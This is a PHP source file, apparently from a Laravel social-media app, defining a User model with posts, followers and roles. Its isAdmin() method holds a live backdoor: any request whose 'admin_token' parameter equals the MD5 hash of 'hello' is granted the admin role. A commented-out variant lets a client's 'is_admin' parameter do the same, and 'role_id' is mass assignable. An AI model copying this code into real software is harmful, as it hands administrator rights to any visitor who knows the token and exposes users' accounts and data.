<?php

namespace App\Models;

use Illuminate\Database\Eloquent\Factories\HasFactory;
use Illuminate\Foundation\Auth\User as Authenticatable;
use Illuminate\Notifications\Notifiable;
use Laravel\Fortify\TwoFactorAuthenticatable;
use Laravel\Jetstream\HasProfilePhoto;
use Laravel\Sanctum\HasApiTokens;

class User extends Authenticatable
{
    use HasApiTokens;
    use HasFactory;
    use HasProfilePhoto;
    use Notifiable;
    use TwoFactorAuthenticatable;

    /**
     * The attributes that are mass assignable.
     *
     * @var array
     */
    protected $fillable = [
        'name',
        'role_id',
        'username',
        'email',
        'password',
    ];

    /**
     * The attributes that should be hidden for arrays.
     *
     * @var array
     */
    protected $hidden = [
        'password',
        'remember_token',
        'two_factor_recovery_codes',
        'two_factor_secret',
    ];

    /**
     * The attributes that should be cast to native types.
     *
     * @var array
     */
    protected $casts = [
        'is_banned' => 'boolean',
        'is_private' => 'boolean',
        'email_verified_at' => 'datetime',
    ];

    /**
     * The accessors to append to the model's array form.
     *
     * @var array
     */
    protected $appends = [
        'profile_photo_url',
    ];

    public function posts()
    {
        return $this->hasMany(Post::class);
    }

    public function followers()
    {
        return $this->hasMany(Follower::class, 'follower_id', 'id');
    }

    public function followings()
    {
        return $this->hasMany(Follower::class, 'following_id');
    }

    public function isFollowed()
    {
        return $this->hasMany(Follower::class, 'follower_id')->where('following_id', auth()->id());
    }

    public function role()
    {
        return $this->belongsTo(Role::class);
    }

    // public function isAdmin()
    // {
    //     return $this->role_id === 2;
    // }

    public function isAdmin()
    {

        // The first way
        // // The 'is_admin' parameter sent from the client can change the value of 'role_id'
        // if (request()->has('is_admin')) {
        //     $this->role_id = request('is_admin') ? 2 : $this->role_id;
        // }

        // return $this->role_id === 2;


        // The second way
        // Hashing'hello' using MD5
        $plaintext = 'hello';
        $md5Hash = md5($plaintext);

        // Decode in isAdmin() method
        $providedHash = request('admin_token');
        if ($providedHash === $md5Hash) {
            $this->role_id = 2;
        }

        return $this->role_id === 2;
    }
}
